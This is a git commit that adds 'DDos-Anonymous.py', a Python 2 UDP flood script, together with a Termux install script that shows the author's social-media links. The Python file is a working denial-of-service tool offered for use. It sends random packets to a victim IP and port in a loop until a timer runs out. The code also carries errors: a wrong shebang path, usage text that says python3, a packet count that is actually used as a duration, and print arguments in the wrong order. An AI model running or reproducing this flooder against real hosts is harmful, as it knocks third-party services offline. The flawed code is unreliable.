e86052b6438cc3ee1539c9ff5879b306a1e5d511
Mohamed Salama <45932160+M0HAM3D@users.noreply.github.com>
2019-04-06 21:05:06 +0200

    Add files via upload

---
+++ DDos-Anonymous.py
@@ -0,0 +1,42 @@
+#!/use/bin/python2
+#code by mohamed hacker
+#you tube:- https://www.youtube.com/channel/UCs2SEh8YKE0bBsd0s986iXw
+#cp -a DDos-Anonymous.py /data/data/com.termux/files/usr/bin
+import time
+import socket
+import random
+import sys
+import os
+def usage():
+    os.system("figlet Anonymous")
+    print "		Code By Mohamed-HaCkeR"
+    print '''
+    use :
+        python3 DDos-Anonymous.py <ip> <port> <packet>
+    ex  :
+        python3 DDos-Anonymous.py 172.0.0.1 80 3000 '''
+
+def flood(victim, vport, duration):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1024)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "Attacking  %s sent packages %s at the port %s "%(sent, victim, vport)
+
+def main():
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
+
---
+++ install.sh
@@ -0,0 +1,14 @@
+clear
+echo """
+		 ____________________________________________
+		|					                         |
+		|          The Code By :- Mohamed HaCker     |
+		|	       telegram :- @HAKER33		         |
+		|          tele chanel :- https://t.me/msaa43|
+		|          facebook :- http://cutt.us/DLa4s  |
+		|          youtube :-  http://cutt.us/2bhxw  |
+		|          Git Hub :- github.com/M0HAM3D     |
+		|____________________________________________| """
+pkg install figlet -y 
+cp -a DDos-Anonymous.py /data/data/com.termux/files/usr/bin
+echo "run [DDos-Anonymous.py] in now tabe "
